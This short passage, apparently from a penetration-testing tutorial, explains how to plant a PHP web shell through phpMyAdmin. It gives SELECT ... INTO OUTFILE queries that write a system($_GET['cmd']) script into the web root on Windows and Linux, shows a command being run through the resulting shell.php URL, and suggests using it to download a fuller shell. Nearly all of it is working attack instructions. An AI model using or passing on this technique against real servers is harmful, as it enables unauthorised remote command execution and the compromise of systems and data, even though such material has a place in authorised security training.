Upload a shell.<br/>
You go to:<br/>
http://192.168.1.101/phpmyadmin/<br/>
Then click on SQL.<br/>
Run SQL query/queries on server &quot;localhost&quot;:<br/>
From here we can just run a sql-query that creates a php script that works as a shell<br/>
So we add the following query:<br/>
SELECT &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; into outfile &quot;C:\\xampp\\htdocs\\shell.php&quot;<br/>
<br/>
# For linux<br/>
SELECT &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;<br/>
The query is pretty self-explanatory. Now you just visit 192.168.1.101/shell.php?cmd=ipconfig and you have a working web-shell. We can of course just write a superlong query with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there download a better shell.</body></html>
